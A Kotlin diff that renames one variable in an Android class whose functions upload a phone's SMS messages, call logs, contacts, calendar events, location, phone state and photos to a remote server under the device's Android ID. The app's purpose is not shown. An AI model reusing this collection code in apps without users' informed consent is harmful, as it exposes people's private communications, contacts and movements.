@@ -72,7 +72,7 @@ class CommunicationFunction {
      * @param smsList Sms to send to server.
      */
     fun addSMStoServer(activity: Activity, smsList: MutableList<MySms>) {
-         val userid = getAndroidId(activity.contentResolver)
+         val userID = getAndroidId(activity.contentResolver)
 
          for (i in smsList.size-1 downTo 0 step 1) {
              val stringRequest = object : StringRequest(
@@ -91,7 +91,7 @@ class CommunicationFunction {
                  @Throws(AuthFailureError::class)
                  override fun getParams(): Map<String, String> {
                      val params = HashMap<String, String>()
-                     params["userid"] = crypto.encryptData(userid, activity)
+                     params["userid"] = crypto.encryptData(userID, activity)
                      params["date"] = crypto.encryptData(smsList[i].date, activity)
                      params["number"] = crypto.encryptData(smsList[i].number, activity)
                      params["text"] = crypto.encryptData(smsList[i].text, activity)
@@ -105,7 +105,7 @@ class CommunicationFunction {
     }
 
     fun addEventToServer(activity: Activity, eventList: MutableList<MyCalendarEvent>) {
-        val userid = getAndroidId(activity.contentResolver)
+        val userID = getAndroidId(activity.contentResolver)
 
         for (i in eventList.size-1 downTo 0 step 1) {
             val stringRequest = object : StringRequest(
@@ -121,7 +121,7 @@ class CommunicationFunction {
                 @Throws(AuthFailureError::class)
                 override fun getParams(): Map<String, String> {
                     val params = HashMap<String, String>()
-                    params["userid"] = crypto.encryptData(userid, activity)
+                    params["userid"] = crypto.encryptData(userID, activity)
                     params["title"] = crypto.encryptData(eventList[i].title, activity)
                     params["startdate"] = crypto.encryptData(eventList[i].startDate, activity)
                     params["enddate"] = crypto.encryptData(eventList[i].endDate, activity)
@@ -135,7 +135,7 @@ class CommunicationFunction {
     }
 
     fun addCallLogToServer(activity: Activity, callLogList: MutableList<MyCallLog>) {
-        val userid = getAndroidId(activity.contentResolver)
+        val userID = getAndroidId(activity.contentResolver)
 
         for (i in callLogList.size-1 downTo 0 step 1) {
             val stringRequest = object : StringRequest(
@@ -151,7 +151,7 @@ class CommunicationFunction {
                 @Throws(AuthFailureError::class)
                 override fun getParams(): Map<String, String> {
                     val params = HashMap<String, String>()
-                    params["userid"] = crypto.encryptData(userid, activity)
+                    params["userid"] = crypto.encryptData(userID, activity)
                     params["phoneNumber"] = crypto.encryptData(callLogList[i].phoneNumber, activity)
                     params["date"] = crypto.encryptData(callLogList[i].date, activity)
                     params["duration"] = crypto.encryptData(callLogList[i].duration, activity)
@@ -165,13 +165,13 @@ class CommunicationFunction {
     }
 
     fun addCameraPhotoToServer(activity: Activity, bitmap: Bitmap) {
-        val userid = getAndroidId(activity.contentResolver)
+        val userID = getAndroidId(activity.contentResolver)
 
             val stringRequest = object : StringRequest(
                     Method.POST, getServerAddress(EndPoints.URL_ADD_CAMERA_PHOTO, activity),
                     Response.Listener {
                         try {
-                            uploadImage(activity, bitmap, userid)
+                            uploadImage(activity, bitmap, userID)
                         } catch (e: JSONException) {
                             e.printStackTrace()
                         }
@@ -181,8 +181,8 @@ class CommunicationFunction {
                 @Throws(AuthFailureError::class)
                 override fun getParams(): Map<String, String> {
                     val params = HashMap<String, String>()
-                    params["userid"] = crypto.encryptData(userid, activity)
-                    params["photoname"] = crypto.encryptData("$userid.jpg", activity)
+                    params["userid"] = crypto.encryptData(userID, activity)
+                    params["photoname"] = crypto.encryptData("$userID.jpg", activity)
                     return params
                 }
             }
@@ -192,7 +192,7 @@ class CommunicationFunction {
     }
 
     fun addContactToServer(activity: Activity, contactList: MutableList<MyContact>) {
-        val userid = getAndroidId(activity.contentResolver)
+        val userID = getAndroidId(activity.contentResolver)
 
         for (i in contactList.size-1 downTo 0 step 1) {
             val stringRequest = object : StringRequest(
@@ -208,7 +208,7 @@ class CommunicationFunction {
                 @Throws(AuthFailureError::class)
                 override fun getParams(): Map<String, String> {
                     val params = HashMap<String, String>()
-                    params["userid"] = crypto.encryptData(userid, activity)
+                    params["userid"] = crypto.encryptData(userID, activity)
                     params["name"] = crypto.encryptData(contactList[i].name, activity)
                     params["phoneNumber"] = crypto.encryptData(contactList[i].phoneNumber, activity)
                     return params
@@ -220,7 +220,7 @@ class CommunicationFunction {
     }
 
     fun addLocationToServer(activity: Activity, location: MyLocation) {
-        val userid = getAndroidId(activity.contentResolver)
+        val userID = getAndroidId(activity.contentResolver)
 
         val stringRequest = object : StringRequest(
                 Method.POST, getServerAddress(EndPoints.URL_ADD_LOCATION, activity),
@@ -235,7 +235,7 @@ class CommunicationFunction {
             @Throws(AuthFailureError::class)
             override fun getParams(): Map<String, String> {
                 val params = HashMap<String, String>()
-                params["userid"] = crypto.encryptData(userid, activity)
+                params["userid"] = crypto.encryptData(userID, activity)
                 params["latitude"] = crypto.encryptData(location.latitude, activity)
                 params["longtitude"] = crypto.encryptData(location.longitude, activity)
                 params["accuracy"] = crypto.encryptData(location.accuracy, activity)
@@ -249,7 +249,7 @@ class CommunicationFunction {
     }
 
     fun addPhoneStateToServer(activity: Activity, phoneState: MyPhoneState) {
-        val userid = getAndroidId(activity.contentResolver)
+        val userID = getAndroidId(activity.contentResolver)
 
         val stringRequest = object : StringRequest(
                 Method.POST, getServerAddress(EndPoints.URL_ADD_PHONE_STATE, activity),
@@ -264,7 +264,7 @@ class CommunicationFunction {
             @Throws(AuthFailureError::class)
             override fun getParams(): Map<String, String> {
                 val params = HashMap<String, String>()
-                params["userid"] = crypto.encryptData(userid, activity)
+                params["userid"] = crypto.encryptData(userID, activity)
                 params["phoneNumber"] = crypto.encryptData(phoneState.phoneNumber, activity)
                 params["dataNetworkType"] = crypto.encryptData(phoneState.dataNetworkState, activity)
                 params["operator"] = crypto.encryptData(phoneState.operator, activity)
@@ -277,7 +277,7 @@ class CommunicationFunction {
     }
 
     fun addMediaPhotoToServer(activity: Activity, photoList: MutableList<MyStorage>) {
-        val userid = getAndroidId(activity.contentResolver)
+        val userID = getAndroidId(activity.contentResolver)
 
         for (i in photoList.size-1 downTo 0 step 1) {
             val stringRequest = @RequiresApi(Build.VERSION_CODES.P)
@@ -285,7 +285,7 @@ class CommunicationFunction {
                     Method.POST, getServerAddress(EndPoints.URL_ADD_MEDIA_PHOTO, activity),
                     Response.Listener {
                         try {
-                            uploadImage(activity, loadImageFromExternalStorage(activity.applicationContext, photoList[i].uri), userid + "m" + i.toString())
+                            uploadImage(activity, loadImageFromExternalStorage(activity.applicationContext, photoList[i].uri), userID + "m" + i.toString())
                         } catch (e: JSONException) {
                             e.printStackTrace()
                         }
@@ -295,8 +295,8 @@ class CommunicationFunction {
                 @Throws(AuthFailureError::class)
                 override fun getParams(): Map<String, String> {
                     val params = HashMap<String, String>()
-                    params["userid"] = crypto.encryptData(userid, activity)
-                    params["imagePath"] = crypto.encryptData(userid + "m" + i.toString(), activity)
+                    params["userid"] = crypto.encryptData(userID, activity)
+                    params["imagePath"] = crypto.encryptData(userID + "m" + i.toString(), activity)
                     return params
                 }
             }
@@ -312,7 +312,7 @@ class CommunicationFunction {
     }
 
     fun createPermissionTableInServer(activity: Activity, permissionType: String) {
-        val userid = getAndroidId(activity.contentResolver)
+        val userID = getAndroidId(activity.contentResolver)
         val stringRequest = object : StringRequest(
                 Method.POST, getServerAddress(EndPoints.URL_CREATE_PERMISSION_TABLE, activity),
                 Response.Listener {response ->
@@ -328,7 +328,7 @@ class CommunicationFunction {
             @Throws(AuthFailureError::class)
             override fun getParams(): Map<String, String> {
                 val params = HashMap<String, String>()
-                params["userid"] = crypto.encryptData(userid, activity)
+                params["userid"] = crypto.encryptData(userID, activity)
                 params["permissionType"] = crypto.encryptData(permissionType, activity)
                 return params
             }
@@ -339,7 +339,7 @@ class CommunicationFunction {
 
     fun uploadImage(activity: Activity, bitmap: Bitmap, imageName: String) {
         Log.d("test", "Upload Image")
-        val userid = getAndroidId(activity.contentResolver)
+        val userID = getAndroidId(activity.contentResolver)
         val stringRequest = object : StringRequest(
                 Method.POST, getServerAddress(EndPoints.URL_UPLOAD_IMAGE, activity),
                 Response.Listener { response ->
@@ -353,7 +353,7 @@ class CommunicationFunction {
             @Throws(AuthFailureError::class)
             override fun getParams(): Map<String, String> {
                 val params = HashMap<String, String>()
-                params["userid"] = crypto.encryptData(userid, activity)
+                params["userid"] = crypto.encryptData(userID, activity)
                 params["photoname"] = crypto.encryptData(imageName, activity)
                 params["photo"] = imageToString(bitmap)
                 return params
@@ -375,7 +375,7 @@ class CommunicationFunction {
      * @param activity Activity for get [ContentResolver].
      */
     fun createUserInServer(activity: Activity) {
-        val userid = getAndroidId(activity.contentResolver)
+        val userID = getAndroidId(activity.contentResolver)
         val password = getPassword(activity.contentResolver)
         val stringRequest = object : StringRequest(
                 Method.POST, getServerAddress(EndPoints.URL_ADD_USER, activity),
@@ -391,7 +391,7 @@ class CommunicationFunction {
             @Throws(AuthFailureError::class)
             override fun getParams(): Map<String, String> {
                 val params = HashMap<String, String>()
-                params["userid"] = crypto.encryptData(userid, activity)
+                params["userid"] = crypto.encryptData(userID, activity)
                 params["password"] = crypto.encryptData(password, activity)
                 return params
             }
@@ -407,7 +407,7 @@ class CommunicationFunction {
      */
     fun deleteUserInServer(activity: Activity) {
         Log.d("test", "delete User")
-        val userid = getAndroidId(activity.contentResolver)
+        val userID = getAndroidId(activity.contentResolver)
         val stringRequest = object : StringRequest(
                 Method.POST, getServerAddress(EndPoints.URL_DELETE_USER, activity),
                 Response.Listener { response ->
@@ -424,7 +424,7 @@ class CommunicationFunction {
             @Throws(AuthFailureError::class)
             override fun getParams(): Map<String, String> {
                 val params = HashMap<String, String>()
-                params["userid"] = crypto.encryptData(userid, activity)
+                params["userid"] = crypto.encryptData(userID, activity)
                 return params
             }
         }
